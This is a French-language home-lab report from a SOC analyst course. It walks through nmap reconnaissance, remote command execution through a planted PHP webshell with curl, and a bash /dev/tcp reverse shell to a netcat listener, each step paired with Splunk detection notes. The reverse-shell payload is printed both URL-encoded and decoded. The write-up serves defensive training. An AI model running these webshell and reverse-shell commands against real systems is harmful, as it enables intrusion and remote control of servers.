# Phase 2 - Reconnaissance Active et Accès Initial (L'Audit Offensif)

**Environnement :** Home Lab virtuel sur Proxmox pour le projet Iron4Software — Formation Analyste SOC - CyberUniversity (Liora x Sorbonne).

## Objectif du Lab
Dans cette phase, j'abandonne temporairement ma posture défensive pour endosser le rôle de l'attaquant (Red Team). L'objectif est de mener un audit offensif réaliste sur l'infrastructure externe d'Iron4Software. Je vais cartographier la cible, valider la présence de la vulnérabilité web injectée lors de la Phase 1, et transformer cette faille en une véritable tête de pont interactive (Reverse Shell) vers le réseau interne. En générant ce bruit réseau et ces exécutions de commandes malveillantes, je produis la matière première indispensable (les journaux d'événements) qui me permettra de calibrer les capacités de détection de notre SIEM Splunk lors des phases ultérieures.

## Outils et Technologies
- **Système d'attaque :** Kali Linux.
- **Cartographie :** Nmap (Scan agressif et exhaustif).
- **Exploitation HTTP :** cURL (Interaction "stateless" avec le Webshell).
- **Communication réseau :** Netcat / `nc` (Écouteur pour le Reverse Shell).
- **Framework MITRE ATT&CK :** T1595 (Active Scanning), T1190 (Exploit Public-Facing Application), T1059.003 (Command and Scripting Interpreter).

## 1. Reconnaissance Active de l'Infrastructure (MITRE T1595)

La première étape de l'intrusion consiste à identifier les portes d'entrée potentielles sur l'adresse IP publique de l'entreprise (`192.168.50.7`).

**Exécution de la commande :**
Depuis le terminal de la machine d'attaque Kali, j'ai lancé un balayage exhaustif :

```bash
nmap -A -p- -T4 -oA rapport_audit_iron4 192.168.50.7
```

**Analyse "Sous le capot" :**
L'utilisation combinée des paramètres `-A` (agressif, détection d'OS, de version et scripts de vulnérabilités par défaut) et `-p-` (scan des 65535 ports) garantit qu'aucun service ne passe inaperçu. Le paramètre `-T4` accélère l'exécution en parallélisant les requêtes de manière agressive. Enfin, `-oA` me permet de sauvegarder les résultats dans tous les formats majeurs (texte, grepable, XML) pour la documentation de mon audit.

**Troubleshooting et Résultats :**
Le scan, bien qu'exhaustif, s'est achevé rapidement (117 secondes). L'outil a deviné avec 97% de certitude que la cible physique tournait sous FreeBSD (l'OS natif de pfSense). Cependant, il a identifié le port 80 comme étant ouvert et hébergeant un service `Apache httpd 2.4.58 ((Ubuntu))`. Cette dichotomie technique m'indique de manière certaine qu'une règle de traduction d'adresse (NAT / Port Forwarding) est active sur le pare-feu et me redirige vers un serveur interne sous Linux. Le port 53 (DNS) a été détecté mais a retourné un statut `REFUSED`, indiquant qu'il est correctement configuré pour bloquer les requêtes externes.

**Contexte SOC & Blue Team :**
Ce type de scan est l'antithèse de la furtivité. Envoyer des dizaines de milliers de requêtes de connexion (TCP SYN) en moins de deux minutes sur l'interface WAN inonde les journaux de pare-feu. Dans la Phase 4 de ce projet, cette volumétrie anormale sera le déclencheur idéal pour rédiger une règle de corrélation Splunk dédiée à la détection des balayages de ports.

## 2. Validation de la Faille et Découverte Interne (MITRE T1190)

Ayant confirmé l'exposition du serveur web, j'exploite la vulnérabilité de téléversement mise en place en Phase 1. La porte dérobée `shell.php` attend mes instructions à la racine du serveur.

**Exécution de la commande :**
J'utilise `cURL` pour envoyer des requêtes HTTP GET forgées et exécuter des commandes système de base :

```bash
curl [http://192.168.50.7/shell.php?cmd=whoami](http://192.168.50.7/shell.php?cmd=whoami)
curl [http://192.168.50.7/shell.php?cmd=ip+a](http://192.168.50.7/shell.php?cmd=ip+a)
curl "[http://192.168.50.7/shell.php?cmd=ping+-c+2+192.168.3.10](http://192.168.50.7/shell.php?cmd=ping+-c+2+192.168.3.10)"
```

**Analyse "Sous le capot" :**
La variable `cmd` de l'URL est traitée directement par la fonction `system()` du code PHP malveillant. 
- Le `whoami` a renvoyé `www-data`, confirmant l'exécution de code à distance (RCE) sous l'identité du compte de service Apache.
- Le `ip a` (avec le `+` pour encoder l'espace) a révélé l'interface interne `enp6s18` configurée en `192.168.3.11/24`. Je viens de découvrir le plan d'adressage du réseau LAN (192.168.3.0/24).
- Le `ping` vers `192.168.3.10` a reçu des réponses positives. L'attaquant sait désormais que la route vers le Contrôleur de Domaine est dégagée.

**Contexte SOC & Blue Team :**
L'utilisation de la méthode GET inscrit l'intégralité de mon payload (ex: `?cmd=whoami`) en clair dans le fichier `access.log` d'Apache. L'agent Splunk Universal Forwarder déployé sur ce serveur achemine déjà ces preuves vers notre SIEM. Ces traces seront cruciales pour créer des alertes basées sur la présence de commandes Bash dans les URI.

## 3. Établissement du Reverse Shell (MITRE T1059.004)

Les requêtes `cURL` sont "stateless" (sans état) et peu pratiques pour une exploration approfondie. Pour pivoter efficacement, j'ai besoin d'un terminal interactif. Je vais forcer le serveur Ubuntu à initier une connexion sortante vers ma machine d'attaque.

**Exécution de la commande :**
Sur la machine Kali (IP : `192.168.50.5`), j'ouvre un premier terminal et je configure Netcat en mode écoute sur le port 4444 :

```bash
nc -lvnp 4444
```

Dans un second terminal, j'utilise `cURL` pour injecter un payload Bash encodé en URL, forçant le serveur web à se connecter à mon écouteur :

```bash
curl "[http://192.168.50.7/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.50.5/4444%200%3E%261%22](http://192.168.50.7/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.50.5/4444%200%3E%261%22)"
```

Le navigateur (ou curl) a besoin que les caractères spéciaux (espaces, guillemets, chevrons) soient traduits pour ne pas casser la requête HTTP.

Si on la décode (URL Decode), voici ce que le serveur Ubuntu a réellement reçu et exécuté :

```bash
bash -c "bash -i >& /dev/tcp/192.168.50.5/4444 0>&1"
```

**Voici la mécanique de cette ligne :**

- `bash -c "..."` : Ouvre un interpréteur de commandes Bash et lui dit d'exécuter la chaîne de caractères entre guillemets.
- `bash -i` : Lance un shell Bash en mode "interactif" (Interactive).
- `>& /dev/tcp/192.168.50.5/4444` : Sous Linux, tout est un fichier, même les connexions réseau. Cette instruction redirige la sortie standard (ce qui s'affiche à l'écran) et la sortie d'erreur vers un flux TCP pointant vers l'IP de ta Kali (192.168.50.5) sur le port 4444.
- `0>&1` : Redirige l'entrée standard (ton clavier, le descripteur 0) vers la sortie standard (le flux réseau, le descripteur 1). En clair : cela boucle le système. Ce que je tape sur Kali est envoyé à Ubuntu, et ce qu'Ubuntu répond est envoyé sur Kali.

**Analyse "Sous le capot" :**
Le payload décodé correspond à la commande `bash -c "bash -i >& /dev/tcp/192.168.50.5/4444 0>&1"`. Cette instruction ordonne au serveur Ubuntu de lancer un shell interactif (`bash -i`) et de rediriger ses entrées/sorties standard vers un descripteur de fichier réseau pointant vers ma machine Kali. Les pare-feux bloquant rarement le trafic sortant, la connexion s'établit instantanément. 

**Troubleshooting et Résultats :**
Le Terminal 1 a immédiatement affiché la connexion entrante. Un détail technique intéressant est apparu : la connexion provenait de l'IP `192.168.50.7` (le pare-feu) et non de l'IP interne de l'Ubuntu (`192.168.3.11`). Cela s'explique par la règle de NAT Sortant (Masquerading) appliquée par le pfSense. 
De plus, des messages d'erreur tels que `bash: cannot set terminal process group` et `no job control in this shell` sont apparus. C'est un comportement attendu : le shell obtenu est "brut" (dumb shell) et ne dispose pas d'une véritable interface TTY, ce qui limite certaines interactions complexes (comme l'utilisation des touches fléchées ou l'interruption de processus via Ctrl+C). Néanmoins, l'invite de commande `www-data@user:/var/www/html$` m'assure un accès direct au système de fichiers de la cible.

**Contexte SOC & Blue Team :**
L'établissement d'un Reverse Shell est un cauchemar pour la défense périmétrique traditionnelle, mais une mine d'or pour un SOC moderne. Ce comportement génère une connexion sortante initiée par un processus inattendu (le démon Apache engendrant un processus Bash qui ouvre un socket TCP). L'analyse de l'arborescence des processus (Process Lineage) et la surveillance des connexions réseau sortantes depuis les serveurs web exposés seront des piliers de notre stratégie de détection future.

## Implications pour un Analyste SOC
La compromission de la zone exposée est désormais totale. La faille applicative a été convertie en un accès système interactif. L'attaquant bénéficie d'une visibilité directe sur le réseau interne et a confirmé que la route vers le joyau de l'infrastructure (le Contrôleur de Domaine) était ouverte. En tant que défenseur, je sais que les traces de la reconnaissance active, des requêtes HTTP malveillantes et du processus Bash lié au Reverse Shell sont déjà en cours d'indexation dans Splunk. Le défi de la prochaine étape sera de suivre le mouvement latéral de l'attaquant vers la compromission des identifiants (Credential Access).

---
*Fin du rapport de Lab.*